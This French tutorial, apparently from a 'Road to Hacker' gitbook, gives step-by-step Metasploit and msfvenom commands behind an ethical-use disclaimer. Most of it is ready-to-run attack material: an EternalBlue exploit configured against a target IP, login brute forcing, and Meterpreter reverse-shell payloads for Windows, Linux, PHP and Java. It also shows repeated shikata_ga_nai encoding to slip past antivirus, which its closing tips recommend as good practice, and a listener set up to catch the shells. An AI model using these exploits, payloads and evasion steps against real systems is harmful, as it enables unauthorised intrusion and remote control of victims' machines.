# Metasploit & Msfvenom

## Metasploit et Msfvenom - Guide Complet pour l'Exploitation et la Génération de Payloads

⚠️ **Avertissement** : Ce contenu est strictement destiné à un usage éducatif et éthique dans le domaine de la cybersécurité. Toute utilisation illégale ou malveillante est interdite et engage la seule responsabilité de l’utilisateur.

***

### Introduction

**Metasploit Framework** est une plateforme complète pour effectuer des tests de pénétration, gérer des exploits, et automatiser des attaques. Il intègre un vaste éventail de modules pour l'exploration, l'exploitation et le post-exploitation.

**Msfvenom**, un composant de Metasploit, est utilisé pour générer des payloads, encoder des données, et les rendre indétectables.

***

### 🚀 Étape 1 : Installation de Metasploit

***

#### Installation sur Linux (Debian/Ubuntu)

1.  **Mettez à jour vos paquets** :

    ```bash
    sudo apt update
    ```
2.  **Installez Metasploit** via le script :

    ```bash
    curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb | bash
    ```
3.  **Ajoutez Metasploit au PATH** :

    ```bash
    export PATH=$PATH:/opt/metasploit-framework/bin
    ```
4.  **Lancez Metasploit** :

    ```bash
    msfconsole
    ```

***

#### Installation sur Windows

1. **Téléchargez Metasploit** depuis [Rapid7](https://www.metasploit.com/).
2. **Installez l’exécutable** et suivez les instructions.
3.  Ouvrez une invite de commande et tapez :

    ```cmd
    msfconsole
    ```

### 🛠️ Étape 2 : Commandes Principales de Metasploit

***

#### 1. Lancer la console Metasploit

*   **Commande** :

    ```bash
    msfconsole
    ```
* **Explication** :
  * Lance l'interface interactive où toutes les commandes seront exécutées.

***

#### 2. Rechercher des Exploits

*   **Commande** :

    ```bash
    search <mot-clé>
    ```
*   **Exemple** :

    ```bash
    search smb
    ```
* **Explication** :
  * Affiche une liste des modules (exploits, payloads, auxiliaires) liés au mot-clé.

***

#### 3. Utiliser un Module

*   **Commande** :

    ```bash
    use <nom_du_module>
    ```
*   **Exemple** :

    ```bash
    use exploit/windows/smb/ms17_010_eternalblue
    ```
* **Explication** :
  * Charge le module d'exploit EternalBlue.

***

#### 4. Configurer les Options

*   **Commande** :

    ```bash
    set <option> <valeur>
    ```
*   **Exemple** :

    ```bash
    set RHOSTS 192.168.1.10
    set PAYLOAD windows/x64/meterpreter/reverse_tcp
    set LHOST 192.168.1.5
    ```
* **Explication** :
  * Configure les options nécessaires pour l'exploit, comme l'adresse IP cible, le payload, et l'adresse de votre machine.

***

#### 5. Lancer un Exploit

*   **Commande** :

    ```bash
    exploit
    ```
* **Explication** :
  * Lance l'exploit configuré pour pénétrer le système cible.

***

#### 6. Gérer les Sessions

*   **Afficher les sessions actives** :

    ```bash
    sessions
    ```
*   **Interagir avec une session** :

    ```bash
    sessions -i <id_de_session>
    ```
* **Explication** :
  * Permet de contrôler un système compromis à travers une session ouverte.

***

###

### 🔍  Étape 3 : Modules Auxiliaires et Payloads

***

#### 1. Scanner un Réseau pour Identifier des Vulnérabilités

*   **Commande** :

    ```bash
    use auxiliary/scanner/portscan/tcp
    set RHOSTS 192.168.1.0/24
    run
    ```
* **Explication** :
  * Scanne les ports ouverts sur un réseau donné pour détecter des vulnérabilités.

***

#### 2. Réaliser une Attaque par Force Brute

*   **Commande** :

    ```bash
    use auxiliary/scanner/http/http_login
    set RHOSTS 192.168.1.10
    set TARGETURI /login
    set USER_FILE /path/to/users.txt
    set PASS_FILE /path/to/passwords.txt
    run
    ```
* **Explication** :
  * Utilise une liste de noms d'utilisateur et de mots de passe pour tester un formulaire de connexion.

***

### 🚀 Étape 4 : Msfvenom - Génération de Payloads

***

**Msfvenom** est utilisé pour générer des payloads personnalisés et les encoder pour les rendre indétectables.

***

#### 1. Générer un Payload Windows

*   **Commande** :

    ```bash
    msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f exe -o payload.exe
    ```
* **Explication** :
  * `-p` : Spécifie le payload à utiliser (ici `reverse_tcp` pour une connexion inverse).
  * `LHOST` : Votre adresse IP.
  * `LPORT` : Le port d'écoute.
  * `-f exe` : Formate le payload en un fichier exécutable Windows.
  * `-o` : Spécifie le nom de sortie du fichier généré.

***

#### 2. Générer un Payload Linux

*   **Commande** :

    ```bash
    msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f elf -o payload.elf
    ```
* **Explication** :
  * Formate le payload en un fichier ELF pour Linux.

***

#### 3. Générer un Payload Web (PHP)

*   **Commande** :

    ```bash
    msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f raw -o shell.php
    ```
* **Explication** :
  * Génère un shell PHP pour obtenir une session Meterpreter.

***

#### 4. Encoder un Payload pour Contourner les Antivirus

*   **Commande** :

    ```bash
    msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -e x86/shikata_ga_nai -i 10 -f exe -o payload_encoded.exe
    ```
* **Explication** :
  * `-e` : Utilise un encodeur (ici `shikata_ga_nai`).
  * `-i 10` : Encode le payload 10 fois pour augmenter les chances de contournement.

***

#### 5. Générer un Payload Multi-Plateforme

*   **Commande** :

    ```bash
    msfvenom -p java/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f jar -o payload.jar
    ```
* **Explication** :
  * Crée un payload au format `.jar` pour cibler les environnements Java.

***

### 🎯 Étape 5 : Configurer un Listener dans Metasploit

***

#### Configurer Metasploit pour Recevoir le Payload

1.  **Lancer la console Metasploit** :

    ```bash
    msfconsole
    ```
2.  **Sélectionner un handler** :

    ```bash
    use exploit/multi/handler
    ```
3.  **Configurer le payload** :

    ```bash
    set PAYLOAD windows/x64/meterpreter/reverse_tcp
    set LHOST 192.168.1.5
    set LPORT 4444
    ```
4.  **Lancer le listener** :

    ```bash
    exploit
    ```

* **Explication** :
  * Permet de recevoir une connexion depuis le payload exécuté sur la machine cible.

***

### 📋 Étape 6 : Exemples de Scénarios Pratiques

***

#### 1. Exploiter une Vulnérabilité SMB

*   **Commande** :

    ```bash
    use exploit/windows/smb/ms17_010_eternalblue
    set RHOSTS 192.168.1.10
    set PAYLOAD windows/x64/meterpreter/reverse_tcp
    set LHOST 192.168.1.5
    exploit
    ```

#### 2. Générer un Payload Windows et Écouter

*   **Créer le payload** :

    ```bash
    msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f exe -o payload.exe
    ```
*   **Configurer le handler** :

    ```bash
    use exploit/multi/handler
    set PAYLOAD windows/x64/meterpreter/reverse_tcp
    set LHOST 192.168.1.5
    set LPORT 4444
    exploit
    ```

***

### 📖 Bonnes Pratiques

1. **Obtenez des autorisations légales** :
   * L'utilisation de Metasploit sans autorisation est illégale.
2. **Encodez vos payloads** :
   * Pour éviter leur détection par les antivirus.
3. **Testez dans un environnement isolé** :
   * Toujours utiliser des machines virtuelles pour les tests.

***

**Liens utiles :**

* [Mentions légales](https://dika-1.gitbook.io/road-to-hacker/mentions-legales)
* [Politique de confidentialité](https://dika-1.gitbook.io/road-to-hacker/politique-de-confidentialite)
* [Contactez-nous](mailto:dika-road-to-hacker@protonmail.com)
